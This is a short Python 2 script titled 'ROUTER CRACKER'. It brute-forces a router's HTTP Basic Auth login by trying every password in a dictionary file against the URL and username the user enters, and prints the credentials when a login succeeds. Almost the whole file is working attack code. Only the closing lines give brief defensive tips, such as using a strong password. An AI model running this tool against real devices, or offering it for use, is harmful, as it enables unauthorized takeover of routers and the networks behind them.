from requests.auth import HTTPBasicAuth
import requests

print "\n\t\t#################################################"
print "\t\t#                                               #"
print "\t\t#                ROUTER CRACKER                 #"
print "\t\t#                  BY WARLOCK                   #"
print "\t\t#                                               #"
print "\t\t#################################################"
print("\n[+]PLEASE ENTER ROUTER ADRESS e.g.(http://192.168.0.1 ,  http://192.168.1.1)")
url = raw_input("\n[+]ENTER ADRESS :")
name =  raw_input("\n[+]ENTER USERNAME :")


file=open('../../dictonary.txt','r')


for passw in file:
	p= passw.rstrip()
	auth = HTTPBasicAuth(name,p)
	r = requests.get(url,  auth=auth)
	print"\n[+]TRYING : ",name," ",p
	try:
		if r:
			print"\n[+]LOGIN SUCCESFULL","\t\t","USERNAME :",name," ","PASSWORD :",p
			break
        	else:
         		print"[-]WRONG USERNAME AND PASSWORD"

	except requests.exceptions.ContentDecodingError as e:
		print('\n[-]UNKNOWN ERROR...')


print"\n[+]DID I BREAK PASSWORD OF YOUR ROUTER???"
o=raw_input("y or n : ")

if o=='y':
  print"\n[+]DO WANT SOME HINTS TO STOP THIS ATTACK ???"
  v=raw_input("y or n : ")
  if v=='y':
    print"\n[+]STEP 1.  USE STRONG PASSWORD"
    print"\n[+]STEP 2.  CHANGE THE LOCATION IP OF ROUTER"
    print"\n[+}STEP 3.  IF YOU ARE COMPLETLY UNKNOWN TO THIS STUFF...PLEASE EMAIL ME AT nisargjani20996@gmail.com OR CONSULT TO PENTESTERS / IT CONSULTERS"
  else:
    pass
else:
  pass
raw_input("\n[+]PRESS ANY KEY TO EXIT")
